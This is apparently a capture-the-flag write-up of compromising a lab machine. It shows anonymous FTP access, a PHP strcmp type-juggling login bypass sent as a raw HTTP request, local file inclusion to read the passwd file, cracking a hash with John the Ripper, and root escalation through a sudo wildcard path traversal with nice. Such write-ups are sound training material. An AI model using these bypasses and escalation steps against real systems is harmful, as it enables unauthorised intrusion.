# Enumeration 

Starting with nmap
```bash

```
We have port 22(SSH), 80(HTTP) and 2112. Looking at script scan from nmap, we can tell that 2112 is running FTP.

## FTP
FTP has anonymous access allowed.
```bash
ftp 192.168.154.101 2112
Name (192.168.154.101:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:

ftp> dir
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak
-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg
```

Lets download the files. Looking at `Index.php.bak` file, we got the source-code. The code contains PHP code,  
```php
<?php

$pass= "potato"; //note Change this password regularly

if($_GET['login']==="1"){
  if (strcmp($_POST['username'], "admin") == 0  && strcmp($_POST['password'], $pass) == 0) {
    echo "Welcome! </br> Go to the <a href=\"dashboard.php\">dashboard</a>";
    setcookie('pass', $pass, time() + 365*24*3600);
  }else{
    echo "<p>Bad login/password! </br> Return to the <a href=\"index.php\">login page</a> <p>";
  }
  exit();
}
?>
```

Here, the code was checking for username to be admin and password to potato. Lets check the website.

## Port 80

![image](https://user-images.githubusercontent.com/43528306/147365833-a6d500a8-93e1-4e4f-9292-806f5577711b.png)

The website just contained `Under Construction` message. Lets start directory brute-forcing.
```bash
 ffuf -u http://192.168.154.101/FUZZ -w /usr/share/wordlists/dirb/common.txt -c -e .php,.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.154.101/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .php .txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.htaccess               [Status: 403, Size: 280, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 280, Words: 20, Lines: 10]
admin                   [Status: 301, Size: 318, Words: 20, Lines: 10]
index.php               [Status: 200, Size: 245, Words: 31, Lines: 9]
index.php               [Status: 200, Size: 245, Words: 31, Lines: 9]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10]
:: Progress: [13842/13842] :: Job [1/1] :: 253 req/sec :: Duration: [0:00:58] :: Errors: 0 ::
```
Looking at the results, we found `/admin`. Navigating to it, there's a login form.

![image](https://user-images.githubusercontent.com/43528306/147365858-8ff80a8c-a706-42f7-863c-9c7cf40292e0.png)

We have credentials from the source-code we got via FTP. Using the credentials, we were not able to login. Maybe it was changed
```php
$pass= "potato"; //note Change this password regularly
```
 
Looking back at the source-code, we see 
```php
if (strcmp($_POST['username'], "admin") == 0  && strcmp($_POST['password'], $pass) == 0)
```
 
The code was using `strcmp` with loose comparision (==). We have same case in [this](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf), which refers
to `PHP Type Juggling`. According to it, we can simply pass an array in password field, which will make the 
```php
strcmp(array(),$pass) -> NULL
```
And NULL == 0, which will make the condition true and bypass the authentication.
 
```bash
POST /admin/index.php?login=1 HTTP/1.1
Host: 192.168.157.101
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://192.168.157.101
Connection: close
Referer: http://192.168.157.101/admin/index.php
Upgrade-Insecure-Requests: 1

username=admin&password[]=admin
```
We now have access to admin panel

![image](https://user-images.githubusercontent.com/43528306/147366023-a308d85b-6302-47e0-b0d0-ff119221d2ff.png)

Looking at the options on the page, we found that the log server was vulnerable to LFI

###  Exploiting LFI
The `log` option was allowing us to choose the log file and we can look at them. The request was taking a `file` post parameter, this was vulnerable to LFI.
We can try using LFI payload to retrieve passwd file and we were indeed successful.

![image](https://user-images.githubusercontent.com/43528306/147366338-104b85a1-93e9-4675-b478-0dfbb7a9be67.png)

Looking at the output, we can see the password for user named `webadmin`. We can try cracking this hash using *John The Ripper*. 
```bash
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
dragon           (?)
1g 0:00:00:00 DONE (2021-12-24 22:41) 3.571g/s 1371p/s 1371c/s 1371C/s 123456..michael1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
We were successfully able to crack the password. We can now ssh into the box.

### Shell as webadmin

We now have shell as `webadmin`, checking for the sudo permissions
```bash
webadmin@serv:/tmp$ sudo -l
Matching Defaults entries for webadmin on serv:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on serv:
    (ALL : ALL) /bin/nice /notes/*
```
*Webadmin* was allowed to run `nice` binary on `/notes/*`.

According to [wikipedia](https://en.wikipedia.org/wiki/Nice_(Unix))
> nice is used to invoke a utility or shell script with a particular CPU priority


Also, there's a wildcard too which makes it vulnerable. We can here simply climb up the directory and execute our script as root. 
Lets create a simple bash script to test it 
```bash
webadmin@serv:~$ chmod +x test.sh;cat test.sh 
whoami
webadmin@serv:~$ pwd
/home/webadmin
webadmin@serv:~$ sudo /bin/nice /notes/../home/webadmin/test.sh
root
```
We were able to execute the script as root. We can now change the content of our script to `bash -p` and get shell as root
```bash
root@serv:~# id
uid=0(root) gid=0(root) groups=0(root)
```

ROOT!!
